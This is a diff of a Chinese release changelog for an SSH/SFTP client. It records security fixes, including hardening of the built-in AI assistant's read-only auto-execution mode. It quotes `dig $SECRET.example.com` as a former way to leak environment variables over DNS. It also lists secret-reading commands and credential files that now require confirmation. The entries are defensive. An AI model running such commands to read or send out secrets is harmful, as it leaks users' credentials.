@@ -17,9 +17,11 @@
 
 ### 修复
 
+- 从托盘菜单点「检查更新」时，更新窗口会出现在最前面，不再被别的窗口挡在后面。
 - 「测试连接」不再把保存的密码发给还没信任的主机：遇到没见过的主机，或者只保存过别种类型密钥的主机，测试只做到握手和显示指纹为止，不进行密码 / 键盘交互验证，结果写明「主机指纹 … 尚未信任，没有测试登录；请先正式连接一次并核对指纹」；跳板链上哪一跳没信任就停在那一跳，后面的主机不连。以前这两种情况会先「仅本次信任」再用保存的密码登录，中间人出示一种没保存过的密钥类型就能拿到明文密码。已经信任的主机照常测试登录。
 - AI 助手「只读自动」模式补了几处会被绕过去的地方：`ping`、`dig`、`nslookup`、`host`、`traceroute`、`tracepath`、`mtr` 的参数里只要有变量、通配符或大括号展开，就不再自动执行（以前 `dig $SECRET.example.com` 这类写法能把环境变量里的内容通过 DNS 查询带出去）；`kubectl get` / `describe` 读 Secret（包括 `secret/名字`、`pods,secrets`、`--raw`）要确认，`kubectl logs` 等不碰 Secret 的照旧自动；命令里带 `<<` / `<<<`（here-doc、here-string）的一律要确认。
 - 「只读自动」读到这些文件也要确认了：sshd 主机私钥（`ssh_host_*_key`，`.pub` 公钥不算）、`/proc/*/environ`（进程的环境变量）、`.bash_history`、`.zsh_history`、`.mysql_history`、`.psql_history`、`.python_history`、`.vault-token`、`credentials.json`、`service-account*.json`。
+- 「只读自动」不再自动执行会把环境变量或查询文件整份交给模型的命令：`env`、不带变量名的 `printenv`、变量名里带 TOKEN / SECRET / KEY / PASS / CRED 的 `printenv`（`printenv PATH`、`printenv HOME` 这类指定普通变量的照旧自动），带 `e` 显示环境的 `ps`（`ps eww`、`ps aux e`；`ps aux`、`ps -ef`、`ps -e` 不受影响），`docker inspect`（含 `container inspect`、`image inspect`）和 `docker top` 里带 `e` 的 ps 选项，`docker compose config --environment`，以及 `kubectl describe` Pod 和 Deployment / StatefulSet / DaemonSet / Job / CronJob 等带 Pod 模板的资源（会列出 `Environment:` 里的字面值）；`dig -f 文件`、`mtr -F 文件`（把文件内容当查询目标发出去）也要确认。`docker network inspect`、`kubectl describe node` / `svc` 等不带环境变量的照旧自动。
 - SFTP 断点续传不再可能接在一个中间有洞的临时文件后面：以前上传 / 下载一批并发写里有一块失败、同批后面的块却已经落盘，再加上这时连接已断导致临时文件截不回去，续传只比对文件末尾 4096 字节，洞发现不了，传完的文件内容会是错的。现在每个任务记着「已经确认写好的连续前缀」，续传点取它和临时文件实际长度中较小的那个，续传前先把多出来的部分截掉；截不动、或者没有这个记录，就整个文件从头传，并在任务说明里写出原因。
 - SFTP 请求等应答的时间从 10 秒放宽到 60 秒：上行慢的链路上，普通的写请求和读请求以前会被误判成超时而中断传输。服务器端复制（`copy-data`，由服务器自己把整个文件拷一遍）这类要等服务器做完的请求单独放宽到 30 分钟。超时的提示现在写清楚等了多久，例如「服务器 60 秒没有响应」。
 - 忘记一台主机的指纹（或更新指纹）时，如果 known_hosts 里是 `host1,host2 ssh-ed25519 …` 这种一行写了多台主机的记录，现在只去掉要忘记的那一台，另一台的指纹保留，不再被连带删掉；哈希主机名的行照旧整行处理。known_hosts 的改写也改成先写同目录的临时文件、刷盘、再原子替换，写到一半断电或磁盘满时原文件保持完整。
